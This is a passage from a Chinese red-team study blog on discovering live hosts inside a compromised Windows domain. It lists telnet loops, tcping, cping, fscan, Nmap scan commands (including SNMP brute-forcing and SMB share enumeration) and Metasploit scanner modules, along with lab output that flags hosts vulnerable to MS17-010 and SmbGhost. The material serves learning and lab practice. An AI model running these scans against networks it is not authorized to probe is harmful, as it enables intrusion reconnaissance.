ICMP unreachable: No-------------------------------------------------------------------------------192.168.7.107Responded in 0 ms.0 hops awayResponds with ICMP unreachable: No-------------------------------------------------------------------------------192.168.7.110Responded in 0 ms.0 hops awayResponds with ICMP unreachable: No-------------------------------------------------------------------------------Scan finished at Tue Feb 23 22:07:49 20213 IPs and 0 ports scanned in 0 hours 0 mins 9.16 secs</code></pre><h2 id="9、telnet"><a href="#9、telnet" class="headerlink" title="9、telnet"></a>9、telnet</h2><p>通过 telnet 探测 445 端口或者其他端口判断主机存活。</p><pre><code>for /l %a in (1,1,254) do start /min /low telnet 192.168.7.%a 445</code></pre><h2 id="10、tcping"><a href="#10、tcping" class="headerlink" title="10、tcping"></a>10、tcping</h2><p>tcping.exe 是一个命令行程序，其操作类似于“ping”，但它通过 TCP 工作，下载地址：<a href="https://elifulkerson.com/projects/tcping.php">https://elifulkerson.com/projects/tcping.php</a></p><pre><code>C:\Users\daniel10&gt;tcping.exe -n 1 192.168.7.7 445Probing 192.168.7.7:445/tcp - Port is open - time=1.719msPing statistics for 192.168.7.7:445     1 probes sent.     1 successful, 0 failed.  (0.00% fail)Approximate trip times in milli-seconds:     Minimum = 1.719ms, Maximum = 1.719ms, Average = 1.719ms</code></pre><h2 id="11、cping"><a href="#11、cping" class="headerlink" title="11、cping"></a>11、cping</h2><p>k8 团队出品，下载地址：<a href="https://www.lanzous.com/i3837ne#Window">https://www.lanzous.com/i3837ne#Window</a></p><p>下载解压后可以看到很多个 exe 文件，其分别代表了.net 编译版本，编译版本对应系统如下：</p><pre><code>XP/2003(已淘汰,用户少,使用的大部分也会装.net,因为好多app需要连驱动都要.net,具体看安装版本一般2.0)Vista       2.0(基本上也没多少用户)Win7/2008   2.0 3.0 3.5Win8/2012   4.0Win8.1      4.0 4.5Win10/2016  4.0 4.6 (4.5未测应该也行)</code></pre><pre><code>C:\Users\daniel10&gt;cping40.exe scan osver 192.168.7.1 192.168.7.255Scan OS version192.168.7.1---192.168.7.255Segment: 192.168.7.0=============================================IP              MAC               HostName        OSver192.168.7.7     00-0C-29-1D-82-CF dc.teamssix.com [Win 2008 R2 Datacenter 7601 SP 1]192.168.7.110   00-0C-29-DC-01-0D daniel10.teamssix.com []192.168.7.107   00-0C-29-A9-62-98 daniel7.teamssix.com [Win 7 Professional 7601 SP 1]=============================================Count:3</code></pre><h2 id="12、fscan"><a href="#12、fscan" class="headerlink" title="12、fscan"></a>12、fscan</h2><p>影舞者大佬写的一款工具，使用起来感觉很是方便，工具下载地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><pre><code>C:\Users\daniel10&gt;fscan.exe -h 192.168.7.1-255 -p 22,445   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 1.5.1scan start(icmp) Target &#39;192.168.7.7&#39; is alive(icmp) Target &#39;192.168.7.110&#39; is alive(icmp) Target &#39;192.168.7.107&#39; is aliveicmp alive hosts len is: 3192.168.7.110:445 open192.168.7.7:445 open192.168.7.107:445 open192.168.7.110 CVE-2020-0796 SmbGhost Vulnerable192.168.7.110  (Windows 10 Pro 18363)[+] 192.168.7.7 MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)[+] 192.168.7.107       MS17-010        (Windows 7 Professional 7601 Service Pack 1)scan end</code></pre><h2 id="13、Nmap"><a href="#13、Nmap" class="headerlink" title="13、Nmap"></a>13、Nmap</h2><p>提到扫描自然不能少了 nmap，nmap 支持多种协议的扫描，具体如下：</p><pre><code>ARP 扫描：            nmap -PR -sn 192.168.7.0/24ICMP 扫描：        nmap ‐sP ‐PI 192.168.7.0/24 ‐T4ICMP 扫描：        nmap ‐sn ‐PE ‐T4 192.168.7.0/24SNMP 扫描：        nmap -sU --script snmp-brute 192.168.7.0/24 -T4UDP 扫描：            nmap -sU -T5 -sV --max-retries 1 192.168.7.7 -p 500NetBIOS 扫描：    nmap --script nbstat.nse -sU -p137 192.168.7.0/24 -T4SMB 扫描：            nmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p 445 192.168.7.0/24……</code></pre><h2 id="14、MSF"><a href="#14、MSF" class="headerlink" title="14、MSF"></a>14、MSF</h2><p>除了 Nmap 之外，万能的 MSF 自然也不能少，MSF 能够进行主机存活探测的模块如下：</p><pre><code>auxiliary/scanner/discovery/udp_probeauxiliary/scanner/discovery/udp_sweepauxiliary/scanner/discovery/arp_sweepauxiliary/scanner/netbios/nbnameauxiliary/scanner/snmp/snmp_enumauxiliary/scanner/smb/smb_version……</code></pre><p>除了上述工具外，还有 netdiscover、snscan 等工具可用于内网主机存活探测，在这其中有些工具因为使用起来感觉探测的不是很理想等原因，在此就不记录了，如果读者感兴趣的话可自行尝试玩玩。</p><blockquote><p>参考文章：</p><p><a href="https://soapffz.com/sec/21.html">https://soapffz.com/sec/21.html</a></p><p><a href="https://micro8.gitbook.io/micro8/contents-1">https://micro8.gitbook.io/micro8/contents-1</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/13722474.html">https://www.cnblogs.com/xiaozi/p/13722474.html</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11908260.html">https://www.cnblogs.com/-mo-/p/11908260.html</a></p><p><a href="https://blog.csdn.net/weixin_42918771/article/details/108798729">https://blog.csdn.net/weixin_42918771/article/details/108798729</a></p><p><a href="https://blog.csdn.net/qq_45366449/article/details/113650656">https://blog.csdn.net/qq_45366449/article/details/113650656</a></p><p><a href="https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/">https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;注：本文中的工具均来源自互联网，后门自查。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在进入目标域后，对域内主机进行存活探测是不可或缺的一步，在此记录一下亿些常见的方法。&lt;/p&gt;
&lt;h2 id=&quot;1、ping&quot;&gt;&lt;a href=&quot;#1、ping&quot; </summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
</feed>
